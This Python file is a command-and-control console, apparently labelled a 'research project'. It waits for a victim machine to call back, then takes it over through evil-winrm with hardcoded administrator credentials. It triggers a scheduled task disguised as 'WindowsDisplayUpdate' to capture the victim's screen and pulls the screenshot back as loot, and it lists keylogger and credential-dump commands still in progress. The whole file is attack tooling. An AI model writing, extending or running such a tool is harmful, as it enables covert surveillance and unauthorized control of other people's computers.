import subprocess
import sys
import socket
import getpass
import platform
import base64
from datetime import datetime

BANNER = r"""
:::::::::  :::::::::   ::::::::  ::::::::::: :::::::::: :::::::: ::::::::::: 
:+:    :+: :+:    :+: :+:    :+:     :+:     :+:       :+:    :+:    :+:     
+:+    +:+ +:+    +:+ +:+    +:+     +:+     +:+       +:+           +:+     
+#++:++#+  +#++:++#:  +#+    +:+     +#+     +#++:++#  +#+           +#+     
+#+        +#+    +#+ +#+    +#+     +#+     +#+       +#+           +#+     
#+#        #+#    #+# #+#    #+# #+# #+#     #+#       #+#    #+#    #+#     
###        ###    ###  ########   #####      ########## ########     ###     
"""

USERNAME = "Adm1nistrator"
PASSWORD = "password"
LISTEN_PORT = 1234

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", LISTEN_PORT))
    server.listen()

    print(f"[+] Listening on 0.0.0.0: {LISTEN_PORT} for incoming connection...")
    conn, addr = server.accept()
    target_ip = addr[0]
    print(f"[+] Connection received from: {target_ip}")

    conn.close()
    server.close()

    return target_ip

def connect_evil_winrm(target_ip):
    print("[*] Launching evil-win-rm...\n")
    cmd = [
        "evil-winrm",
        "-i", target_ip,
        "-u", USERNAME,
        "-p", PASSWORD
    ]
    subprocess.run(cmd)

def ping_target(target_ip, count=1, timeout=2):
    system = platform.system().lower()

    if system == "windows":
        cmd = ["ping", "-n", str(count), "-w", str(timeout * 1000), target_ip]
    else:
        cmd = ["ping", "-c", str(count), "-W", str(timeout), target_ip]

    result = subprocess.run(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    return result.returncode == 0

def check_connection(target_ip, timeout=3):
    ports = {
        5985: "WinRM (HTTP)",
        5986: "WinRM (HTTPS)"
    }

    print(f"[*] Checking Connection to {target_ip}...")

    if not ping_target(target_ip):
        print("[-] Ping failed. Host may be down or ICMP blocked.")
        return None

    print("[+] Ping successful. Host is reachable.\n")

    for port, name in ports.items():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

        try:
            sock.connect((target_ip, port))
            print(f"[+] {name} port {port} is OPEN")
        except socket.timeout:
            print(f"[-] {name} port {port} timed out")
        except ConnectionRefusedError:
            print(f"[-] {name} port {port} is CLOSED")
        except Exception as e:
            print(f"[-] {name} port {port} error: {e}")
        finally:
            sock.close()
    return target_ip

def screenshot(target_ip):
    print("[*] Triggering screenshot task...")

    try:
        TASK_NAME = "WindowsDisplayUpdate"
        REMOTE_FILE = "C:\\Users\\Public\\screen.png"
        LOCAL_DIR = "./Box"
        cmd = [
            "evil-winrm",
            "-i", target_ip,
            "-u", USERNAME,
            "-p", PASSWORD,
            "-c", f'schtasks /run /tn "{TASK_NAME}"'
        ]
        subprocess.run(cmd, stdout=subprocess.DEVNULL)

        time.sleep(3)  # give task time to write file

        print("[*] Downloading screenshot...")
        cmd = [
            "evil-winrm",
            "-i", target_ip,
            "-u", USERNAME,
            "-p", PASSWORD,
            "-c", f'download {REMOTE_FILE} {LOCAL_DIR}'
        ]
        subprocess.run(cmd)
        print("[+] Screenshot saved to ./loot/")
    except:
        print("[-] Failed to save screenshot")


def cli():
    username = getpass.getuser()
    current_target = None
    help_text = """
        Available commands:
        help, h        Show this help menu
        listen         Start listening for a target
        check          Check target connectivity (WinRM ports)
        evil-winrm     Connect to target using evil-winrm
        key-logger     To be determined
        screen-shot    Take screenshot
        dump           Credentials dump
        exit, q        Exit the console
    """
    print("[*] Type help or h to see all commands...\n")
    while True:
        cmd = input(f"{username}@ResearchProject# ")
        if cmd == "exit" or cmd == "q":
            print("[+] Exiting console.")
            break

        elif cmd == "help" or cmd == "h":
            print(help_text)

        elif cmd == "listen":
            current_target = start_listener()

        elif cmd == "check":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                check_connection(current_target)

        elif cmd == "evil-winrm":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                current_target = connect_evil_winrm(current_target)

        elif cmd == "key-logger":
            print("In progress...")

        elif cmd == "screen-shot":
            if not current_target:
                print("[-] No target connected. Use 'listen' first.")
            else:
                screenshot(current_target)
        
        elif cmd == "dump":
            print("In progress...")

        elif cmd == "":
            continue

        else:
            print(f"[-] Unknown command: {cmd}")


def main():
    print(BANNER)
    try:
        cli()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
    

if __name__ == "__main__":
    main()
